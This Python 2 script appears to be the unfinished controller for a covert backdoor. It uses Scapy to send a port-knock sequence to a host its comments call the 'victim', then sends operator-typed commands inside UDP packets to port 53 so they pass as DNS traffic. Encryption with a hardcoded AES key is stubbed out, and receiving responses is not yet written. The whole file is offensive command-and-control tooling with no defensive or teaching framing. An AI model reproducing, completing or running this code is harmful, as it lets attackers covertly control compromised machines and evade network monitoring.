
import sys # For getting command line arguments
from scapy.all import * #Scapy library used to craft packets
from Crypto.Cipher import AES #PiCrypto used for encrypting commands in AES
import time #used for thread sleep methods

global dstIP
global dstPort


def sendCommand(command):
    """Takes in user supplied command string and initiates port knocking (if required)
    and sending of the command"""
    #If it's the first command, send the port knocks
    global counter
    print "The counter is at %d"%(counter)

    #If this is the first message being sent, do a port knock.
    # UNCOMMENT THIS LATER.
    # if(counter == 0):
    #     print "First Message, Authenticating with a port knock first.."
    #     print "The dstIP is STILL %s"%(dstIP)
    #     knockPorts(dstIP)
    #     #wait for response from client
    #     sniff(filter='ip', stop_filter=stopfilter)
    #     print "Got here!"
    #Not the first time sending OR
    #Response from client received, TIME TO SEND!
    print "TIME TO SEND!"
    send(craftCommandPacket(command));
    return;


def knockPorts(dstIP):
    #Send packet sequence 90,91,92
    send(craftKnockPacket(514));
    #Sleep for a second so that Client has time to process.
    time.sleep( 1 )
    send(craftKnockPacket(515));
    time.sleep( 1 )
    send(craftKnockPacket(516));
    #TEST1: Check Wireshark

#Function takes in Destination IP, Destination Port, Data to send
def craftKnockPacket(srcPort):
    global dstIP
    packet = IP(dst=dstIP)/UDP(sport=srcPort, dport=53)
    print "Crafted packet for IP %s with dstPort %s"%(dstIP,dstPort)
    return packet;

def stopfilter(x):
    #If it's from the client's IP
    #TODO: Check if it has the right data.
     global dstIP
     global counter
     counter = counter + 1
     #If the packet that just came in matches the victims IP
     if x[IP].src == dstIP:
         return True
     else:
         return False

def craftCommandPacket(command):
    global dstIP
    global dstPort
    print "dstIP is %s"%dstIP
    print "dstPort is %s"%dstPort
    print "comand is %s"%command
    #TODO:
    # data = encryptMessage(command)

    print "Sending command packet"
    packet = (IP(dst=dstIP)/UDP(sport=int(dstPort),dport=53)/command)
    return packet

#Not finished yet
# def encryptMessage(command):
#     print "Encrypting command: %s"%command
#     key = '0123456789abcdef'
#     IV = 16 * '\x00'           # Initialization vector: discussed later
#     mode = AES.MODE_CBC
#     encryptor = AES.new(key, mode, IV=IV)
#
#     if(len(command) <> 16)
#         text = padCommand(command)
#     print text
#     ciphertext = encryptor.encrypt(text)
#     print "encryptedCommand is: %s"%ciphertext
#     return ciphertext


def padCommand(command):
    print "Len of command is %d"%(len(command))

def listenForResponse():
    print "Listening for response"
    global dstIP
    global dstPort
#
#PsuedoCode:
# 1. Get command line arguments
global dstIP
dstIP = sys.argv[1]
print "Dst IP is %s"%(dstIP)
global dstPort
dstPort = sys.argv[2]
print "Dst Port is %s"%(dstPort)


# Go into the send/receive loop
print "Ready to send/receive with Destination %s : %s"%(dstIP,dstPort)
counter = 0;
while True:
    ##SEND
    print "Enter in command to send"
    command = raw_input()
    print "Command is %s"%(command)
    print "IP is still %s"%(dstIP)
    sendCommand(command)
    listenForResponse()
